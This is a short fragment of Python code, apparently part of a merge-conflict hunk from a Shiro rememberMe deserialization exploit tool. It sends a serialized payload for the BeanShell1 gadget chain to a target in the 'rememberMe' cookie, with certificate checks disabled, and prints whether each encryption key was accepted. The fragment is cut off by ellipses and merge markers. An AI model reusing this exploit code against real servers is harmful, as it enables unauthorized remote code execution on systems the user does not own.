...
=======
        ...
        try:
            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=30)  # 发送验证请求1
            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
            if(r.status_code==200):
 
                print("[+]   ****BeanShell1模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
            else:
                print("[-]   ****BeanShell1模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
>>>>>>> db206e0e1860fd7668d96871efc5c28349d93b1a
